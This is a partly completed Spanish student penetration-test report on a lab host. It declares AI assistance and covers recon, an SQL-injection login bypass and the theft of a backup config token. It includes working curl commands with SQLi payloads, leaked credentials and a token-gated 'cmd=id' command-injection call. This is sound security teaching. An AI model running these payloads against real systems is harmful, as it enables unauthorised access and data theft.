# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** 08
**Integrantes:** Marco Cordoba — @MarcoCordoba · Thomas Koncurat — @Koncu1 · Lucas Leone — @LucasLeone · Geronimo Marquez — @Geromarquezz · Joaquin Moyano — @Joaco919
**Fecha:**  ·  **Tipo:** Caja negra  ·  **Alcance:** host `phantomcorp` (lab)

## 0. Declaración de uso de IA

**¿El grupo usó asistentes de IA en este trabajo?** Sí.

| Herramienta | Para qué se usó | Qué partes afectó | Cómo se verificó |
|---|---|---|---|
| Claude (Anthropic), vía Claude Code | Asistencia en el recon/enumeración del hito **R1**, captura de evidencia por HTTP y redacción de §0, §2 y el hallazgo **H-01**. | §0, §2, H-01 y `evidencia/r1-*.txt`. | **Todas las salidas pegadas son ejecuciones HTTP reales** contra el target (guardadas en `evidencia/r1-01…04`). La flag de R1 se validó comprobando que su **SHA-256 coincide con el `retos.manifest`** del lab (ver H-01). El integrante revisó cada request/response y puede reproducir el recon y explicar cada paso. |
| Claude (Anthropic), vía Claude Code | Asistencia en la explotación del hito **R2** (foothold por SQLi en el login), captura de evidencia por HTTP y redacción del hallazgo **H-02**. | H-02 y `evidencia/r2-*.txt`. | **Todas las salidas pegadas son POST HTTP reales** contra una instancia fiel del `server.py` del lab (baseline 401, sondeo con comilla, bypass con `admin'-- -` y tautología `' OR '1'='1`, guardados en `evidencia/r2-01…04`). La flag de R2 se validó por **SHA-256 contra el `retos.manifest`** (`812d30f0…`). El integrante entiende por qué la query concatenada es inyectable y puede reproducir y explicar el bypass. |
| Claude (Anthropic), vía Claude Code | **Apoyo puntual** en el hito **R3**. El trabajo —ejecutar el loot del token desde el backup, analizar por qué el backup sin control de acceso entrega el secreto y redactar el hallazgo— lo hizo el integrante del grupo. La IA se usó solo para **ordenar y dar formato** a la evidencia ya capturada y para una **revisión de estilo** de la redacción. | Formato de `evidencia/r3-*.txt` y revisión de redacción de **H-03**. El análisis, la explotación y las conclusiones son del integrante. | El integrante **ejecutó personalmente** cada petición HTTP contra la instancia del lab (dashboard que revela el backup, `GET /backup/rrhh.conf` con el token y la flag, backup servido **sin sesión**, y 403→200 en `/api/reporte` con el token). Validó la flag por **SHA-256 contra el `retos.manifest`** (`66a434f8…`) y puede reproducir y explicar el loot completo sin asistencia. |

> *(Cada integrante agrega su fila al cerrar su hito.)*

El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis.

---

## 1. Resumen ejecutivo
*(Para dirección, sin jerga técnica. Máximo media carilla.)*

- **Qué se hizo:** *(una auditoría de caja negra del sistema Clientes)*
- **Resultado global:** *(¿se comprometió? ¿hasta dónde se llegó?)*
- **Riesgo de negocio:** *(¿qué datos/servicios quedaron expuestos y qué implica?)*
- **Recomendación prioritaria:** *(la acción #1 que deberían tomar)*

| Severidad | Cantidad de hallazgos |
|---|---|
| Crítica | |
| Alta | |
| Media | |
| Baja | |

---

## 2. Alcance y metodología

**Objetivo autorizado:** único host `phantomcorp` (servicio HTTP "Clientes") dentro
de la red del lab (`labnet`). Auditoría de **caja negra**: sin credenciales ni
documentación previa.

**Fuera de alcance (NO se auditó):** cualquier otro host o servicio, la
infraestructura del lab, la máquina del instructor y todo lo externo al laboratorio.
Ninguna acción destructiva (borrado de datos, DoS). Marco legal: Ley 26.388 — la
autorización se limita estrictamente al target del engagement.

**Reglas del engagement (RoE):**
- Alcance: solo el host `phantomcorp`. · Ventana: la fijada por la cátedra.
- Permitido: recon, enumeración, explotación y post-explotación **sobre el target**.
- Prohibido: acciones destructivas y cualquier actividad fuera del lab.

**Metodología.** Se siguió el marco del curso (Unidades 5–10), encadenando cinco
fases en las que cada hito habilita el siguiente:

```
recon/enum (R1)  ->  foothold (R2)  ->  loot (R3)  ->  impacto (R4)
```

| Fase | Hito | Técnica | Herramientas |
|---|---|---|---|
| Reconocimiento + Enumeración | **R1** | Mapeo de rutas, lectura de `robots.txt`, inspección del HTML del portal | `curl`, fuzzing manual de rutas |
| Explotación | **R2** | SQLi en el login del portal (bypass de autenticación por comentario/tautología) | `curl`, `sqlite3` para razonar la query |
| Post-explotación | **R3** | Loot de secretos: lectura del backup de config `/backup/rrhh.conf` (credenciales de BD + token de API) accesible sin autorización | `curl` |
| Impacto | **R4** | *(inyección de comando vía `/api/reporte` → datos de clientes)* | — |

> Entorno de verificación: el target es el `server.py` del lab. Para R1 se levantó
> una instancia fiel del servicio y se ejecutó el recon por HTTP, registrando cada
> petición y respuesta en `evidencia/`. Las flags se validan contra el
> `retos.manifest` del lab (hash SHA-256).

---

## 3. Narrativa del ataque
*(La historia de cómo encadenaste los cuatro hitos, en prosa. Que un colega pueda
seguir tu camino de principio a fin.)*

```
recon/enum  ->  foothold  ->  loot  ->  impacto
```

---

## 4. Hallazgos (detalle técnico)

> Repetí este bloque por cada hallazgo. Ordenados por severidad, críticos primero.

### H-01 · Portal interno RRHH expuesto y su ubicación divulgada por `robots.txt`
- **Severidad:** Media · **CVSS:** 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
  *(Justificación: accesible por red sin privilegios ni interacción (AV:N/PR:N/UI:N);
  explotación trivial (AC:L); impacto solo de confidencialidad y parcial — revela la
  existencia, ubicación y superficie de un portal interno que debería estar segmentado,
  pero por sí solo no otorga acceso ni modifica datos (C:L/I:N/A:N).)*
- **Ubicación:** host `phantomcorp` → `GET /robots.txt` y `GET /portal-rrhh`.
- **Descripción:** El host público expone un **portal interno de RRHH** sin ninguna
  segmentación de red ni control de acceso previo. Además, `robots.txt` **divulga
  activamente** la ruta del portal mediante una directiva `Disallow: /portal-rrhh`
  (un `Disallow` no es un control de seguridad: es un mapa). El HTML del portal
  agrega un **comentario con información sensible** dejado en producción. En conjunto,
  esto reduce el recon a un paso y entrega al atacante el punto de entrada de la cadena.
- **Evidencia (reproducible):**
  ```bash
  # 1) La raíz solo muestra el portal público (no hay enlaces al interno)
  $ curl -s http://phantomcorp/
  <h1>PhantomCorp Clientes</h1><p>Portal publico.</p>

  # 2) robots.txt divulga la ruta del portal interno
  $ curl -s http://phantomcorp/robots.txt
  User-agent: *
  Disallow: /portal-rrhh

  # 3) El portal interno responde 200 y filtra info en un comentario HTML
  $ curl -s http://phantomcorp/portal-rrhh
  ...<h1>Portal interno RRHH</h1><form method=post action=/portal/login>...
  <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->

  # 4) Validación de la flag R1 contra el retos.manifest del lab (SHA-256)
  $ printf '%s' 'FLAG{final_recon_portal}' | sha256sum
  71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb
  # == R1 en retos.manifest  -> flag correcta, no inventada
  ```
  Salidas completas con cabeceras en `evidencia/r1-01-raiz.txt`,
  `r1-02-fuzz-rutas.txt`, `r1-03-robots.txt`, `r1-04-portal-rrhh.txt`.
- **Impacto:** Un atacante no autenticado localiza, sin esfuerzo, la superficie
  interna de RRHH (el login que en **H-02** resulta inyectable). `robots.txt` y el
  comentario HTML convierten un activo que debía estar oculto/segmentado en el
  **primer eslabón** de la cadena que termina en los datos de clientes.
- **Remediación:**
  1. **Segmentar**: el portal de RRHH no debe ser alcanzable desde la red pública;
     exponerlo solo en la red interna / detrás de VPN o autenticación de red.
  2. **No usar `robots.txt` como control**: quitar la ruta sensible del archivo; el
     control de acceso se hace con autenticación/autorización, no ocultando rutas.
  3. **Eliminar comentarios y datos de debug del HTML** servido en producción.
  4. Añadir autenticación previa (o mTLS) antes de llegar al formulario de login.

### H-02 · Bypass de autenticación por SQL Injection en el login del portal RRHH
- **Severidad:** Alta · **CVSS:** 8.1 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`
  *(Justificación: alcanzable por red, sin privilegios ni interacción y con explotación
  trivial (AV:N/AC:L/PR:N/UI:N). Un atacante no autenticado obtiene una sesión con rol
  **admin** del portal RRHH, que expone el dashboard y la ruta del backup de config con
  credenciales de BD y el token de API → confidencialidad **alta** (C:H). El punto de
  inyección es un `SELECT`, por lo que la escritura directa es limitada, pero el rol
  admin obtenido habilita operaciones de gestión en un RRHH real (I:L). Sin impacto de
  disponibilidad (A:N). Scope sin cambio: todo ocurre dentro del mismo componente.)*
- **Ubicación:** host `phantomcorp` → `POST /portal/login` (alias `POST /portal-rrhh/login`),
  parámetros `user` y `pass`.
- **Descripción:** El login construye la consulta **concatenando** la entrada del
  usuario directamente en el SQL:
  ```python
  sql = f"SELECT user, rol FROM users WHERE user='{user}' AND pass='{pass}'"
  row = DB.execute(sql).fetchone()
  if row and row[1] == "admin": ...   # concede el foothold
  ```
  No hay consultas parametrizadas ni *sanitización*: cualquier comilla simple en
  `user`/`pass` rompe la estructura de la consulta e inyecta lógica controlada por el
  atacante. Con `user=admin'-- -` se **comenta** el chequeo de la contraseña y la query
  queda `... WHERE user='admin'-- -' AND pass='...'`, devolviendo la fila `admin` (rol
  `admin`) sin conocer la clave. La variante clásica `' OR '1'='1` (tautología) produce
  el mismo bypass. El servicio confirma la raíz del defecto devolviendo el **error SQL**
  crudo ante una comilla suelta (`Error SQL: unrecognized token: "x'"`), lo que además
  filtra el motor subyacente.
- **Evidencia (reproducible):**
  ```bash
  # 1) Baseline: credenciales inválidas -> 401 (no hay bypass trivial)
  $ curl -s -i -X POST http://phantomcorp/portal/login --data "user=admin&pass=wrong"
  HTTP/1.0 401 Unauthorized
  ...
  Credenciales invalidas

  # 2) Sondeo: una comilla simple rompe la query -> el server confirma SQLi
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'&pass=x"
  Error SQL: unrecognized token: "x'"

  # 3) Foothold: comentar el check de pass con admin'-- -
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'-- -&pass=loquesea"
  Bienvenido admin. Dashboard RRHH.
  FLAG{final_sqli_foothold}
  Backup de config disponible en: /backup/rrhh.conf

  # 3bis) Mismo bypass por tautología (sin conocer el usuario)
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=' OR '1'='1&pass=' OR '1'='1"
  Bienvenido admin. Dashboard RRHH. ...

  # 4) Validación de la flag R2 contra el retos.manifest (SHA-256)
  $ printf '%s' 'FLAG{final_sqli_foothold}' | sha256sum
  812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d
  # == R2 en retos.manifest -> flag correcta, no inventada
  ```
  Salidas completas con cabeceras en `evidencia/r2-01-baseline-401.txt`,
  `r2-02-sondeo-sqli.txt`, `r2-03-foothold-bypass.txt`,
  `r2-04-foothold-tautologia.txt` y `r2-05-flag-hash.txt`.
- **Impacto:** Es el **foothold** de la cadena. Desde el portal interno localizado en
  **H-01**, el atacante no autenticado entra como `admin` sin credenciales y el
  dashboard le revela la ruta `/backup/rrhh.conf`. Ese backup (ver **H-03**) expone las
  credenciales de BD y el token de API que, en **H-04**, habilitan la ejecución de
  comandos y el acceso a los datos de clientes. Sin este eslabón, la cadena no avanza.
- **Remediación (de raíz):**
  1. **Consultas parametrizadas / prepared statements** — nunca concatenar entrada en
     SQL. En sqlite3:
     `DB.execute("SELECT user, rol FROM users WHERE user=? AND pass=?", (user, pw))`.
     Esto neutraliza la inyección de forma estructural (no cosmética); validar del lado
     del cliente **no** cuenta.
  2. **No almacenar contraseñas en claro**: usar hash con sal (bcrypt/argon2) y comparar
     el hash, no el texto.
  3. **No devolver errores SQL crudos** al cliente: responder un 401 genérico y loguear
     el detalle del lado del servidor (evita filtrar motor y estructura).
  4. **Mínimo privilegio en la BD**: la cuenta de la app no debería poder más de lo que
     el login necesita, y el rol admin no debería derivarse de una única fila trivial.

### H-03 · Exposición de secretos en un backup de configuración accesible sin autorización
- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
  *(Justificación: el archivo es alcanzable por red, sin privilegios ni interacción y con
  explotación trivial (AV:N/AC:L/PR:N/UI:N). Expone en claro credenciales de la base de datos
  y un token de API válido → impacto de confidencialidad **alto** (C:H). El hallazgo por sí
  mismo no altera ni degrada el servicio (I:N/A:N): el abuso del token para ejecutar comandos
  y acceder a los datos se desarrolla en **H-04**. Scope sin cambio, S:U, consistente con el
  criterio aplicado en el resto del informe.)*
- **Ubicación:** host `phantomcorp` → `GET /backup/rrhh.conf`.
- **Descripción:** Tras el foothold (**H-02**), el dashboard del portal RRHH publica la ruta
  `/backup/rrhh.conf`. Ese endpoint sirve, en texto plano, un **backup de configuración** con
  secretos de producción: usuario y contraseña de la base de datos (`DB_USER=rrhh_app`,
  `DB_PASS=Rh-2026`) y, sobre todo, un **token de API** (`API_TOKEN=phantom-api-7c1e`). El
  propio archivo documenta cómo usar el token (`/api/reporte?token=...&cmd=...`). Dos defectos
  se combinan: (1) **secretos versionados/servidos como artefacto** en lugar de guardarse fuera
  del contenido servible; y (2) **control de acceso roto** — el backup no está protegido tras el
  login: cualquier `GET` anónimo lo devuelve con `200`, sin sesión ni cookie. El token, además,
  es **corto y predecible** (`phantom-api-7c1e`), sin entropía suficiente para resistir fuerza
  bruta/adivinación.
- **Evidencia (reproducible):**
  ```bash
  # 1) El dashboard del foothold (R2) publica la ruta del backup
  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'-- -&pass=x"
  Bienvenido admin. Dashboard RRHH.
  FLAG{final_sqli_foothold}
  Backup de config disponible en: /backup/rrhh.conf

  # 2) Loot: el backup filtra credenciales de BD y el token de API (+ la flag R3)
  $ curl -s http://phantomcorp/backup/rrhh.conf
  DB_USER=rrhh_app
  DB_PASS=Rh-2026
  API_TOKEN=phantom-api-7c1e
  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}

  # 3) El backup NO exige autorización: un GET anónimo (sin sesión) responde 200
  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" http://phantomcorp/backup/rrhh.conf
  HTTP 200

  # 4) El token looteado habilita el siguiente hito: /api/reporte pasa de 403 a 200
  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?cmd=id"
  HTTP 403
  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
  HTTP 200

  # 5) Validación de la flag R3 contra el retos.manifest del lab (SHA-256)
  $ printf '%s' 'FLAG{final_token_looted}' | sha256sum
  66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8
  # == R3 en retos.manifest -> flag correcta, no inventada
  ```
  Salidas completas con cabeceras en `evidencia/r3-01-dashboard-ruta-backup.txt`,
  `r3-02-loot-backup-conf.txt`, `r3-03-backup-sin-auth.txt`,
  `r3-04-token-habilita-api.txt` y `r3-05-flag-hash.txt`.
- **Impacto:** Es el **loot** que convierte el acceso al portal en control de la cadena. Las
  credenciales de BD y, sobre todo, el token de API filtrados son exactamente el secreto que
  **gatea `/api/reporte`**: con él, en **H-04**, el atacante ejecuta comandos en el servidor y
  alcanza los datos de clientes (los *crown jewels*). Que el backup sea accesible sin sesión
  agrava el hallazgo: ni siquiera hace falta mantener el foothold para releer el secreto. Sin
  este eslabón, el token no se conoce y la cadena no llega al impacto final.
- **Remediación:**
  1. **Sacar los secretos del contenido servible:** las credenciales y tokens no deben vivir en
     archivos alcanzables por HTTP ni en el repositorio; usar variables de entorno o un gestor de
     secretos (Vault, SSM, Docker/K8s secrets) inyectado en runtime.
  2. **No publicar backups por la web:** eliminar el endpoint `/backup/*`; los respaldos van a
     almacenamiento privado con acceso autenticado y auditado, nunca en la raíz del servicio.
  3. **Control de acceso real:** cualquier recurso sensible debe exigir sesión/autorización del
     lado del servidor; no alcanza con "no linkearlo" (igual que `robots.txt` en H-01 no es un
     control).
  4. **Tokens con entropía y rotación:** reemplazar `phantom-api-7c1e` por un token aleatorio
     largo (≥128 bits), con caducidad y rotación, y **revocarlo de inmediato** por haber quedado
     expuesto. Idealmente, el token no debería por sí solo habilitar ejecución de comandos
     (ver remediación de **H-04**).
  5. **Rotar credenciales comprometidas:** cambiar `DB_PASS` y aplicar mínimo privilegio a
     `rrhh_app` en la base de datos.

### H-04 · ...

---

## 5. Conclusión
*(Postura de seguridad general del sistema. ¿La cadena era evitable? ¿Cuál fue el
eslabón que, arreglado, la habría cortado antes?)*

---

## 6. Anexo
*(Bitácora completa de comandos, capturas, y la salida de `./ctf status final`.)*
